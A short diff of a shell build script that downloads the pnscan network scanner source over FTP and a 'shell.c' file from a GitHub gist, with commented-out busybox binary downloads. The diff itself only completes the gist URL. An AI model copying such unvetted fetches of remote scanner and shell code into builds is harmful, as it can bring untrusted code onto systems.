@@ -1,7 +1,7 @@
 #!/bin/sh
 
 cd builder && mkdir bin && wget ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz
-wget https://gist.githubusercontent.com/parse/9 && ls -la sh
+wget https://gist.githubusercontent.com/parse/966049/raw/360794c160b2440b52cb9b81ca6d7145c2261fbf/shell.c && ls -la sh
 #wget https://www.busybox.net/downloads/binaries/1.30.0-i686/busybox_ASH -O sh && chmod u+x sh
 #wget https://www.busybox.net/downloads/binaries/1.30.0-i686/busybox_LS -O ls && chmod u+x ls
 #wget https://www.busybox.net/downloads/binaries/1.30.0-i686/busybox -O busybox && chmod u+x busybox
